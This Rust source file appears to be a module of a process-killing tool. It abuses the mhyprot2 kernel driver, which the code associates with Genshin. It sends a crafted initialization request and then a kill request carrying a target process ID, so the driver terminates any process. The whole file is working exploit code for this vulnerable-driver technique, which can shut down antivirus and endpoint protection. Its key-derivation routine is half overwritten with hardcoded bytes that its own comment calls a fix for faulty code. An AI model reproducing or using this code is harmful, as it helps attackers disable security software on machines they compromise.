use std::ffi::c_void;

use crate::win32::connect_to_device;
use crate::DriverBuilder;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Threading::GetCurrentProcessId;
use windows::Win32::System::IO::DeviceIoControl;

pub struct Genshin {
    device: HANDLE,
    pid: u32,
}

impl DriverBuilder for Genshin {
    fn build(pid: u32) -> Result<Box<dyn DriverBuilder>, String> {
        let device = connect_to_device("\\\\.\\mhyprot2")?;

        Genshin::init_driver(device)?;

        return Ok(Box::new(Genshin { device, pid }));
    }

    fn kill(&self) -> Result<(), String> {
        let mut req_data: [u8; 12] = [51, 51, 51, 51, 51, 35, 0, 0, 0xFF, 0xFF, 0, 0];
        let pid_bytes = self.pid.to_le_bytes();
        req_data[8] = pid_bytes[0];
        req_data[9] = pid_bytes[1];

        if let Err(_) = unsafe {
            DeviceIoControl(
                self.device,
                0x81034000,
                Some(&req_data as *const _ as *const c_void),
                std::mem::size_of::<[u8; 12]>() as u32,
                None,
                0,
                None,
                None,
            )
        } {
            return Err("Could not kill process with PID ".to_owned() + &self.pid.to_string());
        }

        return Ok(());
    }
}

impl Genshin {
    fn init_driver(device: HANDLE) -> Result<(), &'static str> {
        let data: [u8; 16] = Genshin::init_data();
        let mut dw_bytes_returned: u32 = 0;

        if let Err(_) = unsafe {
            DeviceIoControl(
                device,
                0x80034000,
                Some(&data as *const _ as *const c_void),
                std::mem::size_of::<[u8; 16]>() as u32,
                None,
                0,
                Some(&mut dw_bytes_returned),
                None,
            )
        } {
            return Err("Could not initialize driver");
        }

        return Ok(());
    }

    fn init_data() -> [u8; 16] {
        let seed: u64 = 0x233333333333;
        let pid = unsafe { GetCurrentProcessId() } as u64;
        let pid_data = 0xBAEBAEEC00000000 + pid;
        let low = seed ^ 0xEBBAAEF4FFF89042;
        let high = seed ^ pid_data;

        let mut data: [u8; 16] = Default::default();

        for i in 0..8 {
            let b1: u8 = ((high >> 8 * i) & 0xFF) as u8;
            let b2: u8 = ((low >> 8 * i) & 0xFF) as u8;
            data[i] = b1;
            data[i + 8] = b2;
        }
        // above implementation is faulty so I hardcoded the static values
        data[2] = 0x33;
        data[3] = 0x33;
        data[4] = 0xdf;
        data[5] = 0x8d;
        data[6] = 0xeb;
        data[7] = 0xba;
        data[8] = 0x71;
        data[9] = 0xa3;
        data[10] = 0xcb;
        data[11] = 0xcc;
        data[12] = 0xc7;
        data[13] = 0x8d;
        data[14] = 0xba;
        data[15] = 0xeb;

        return data;
    }
}
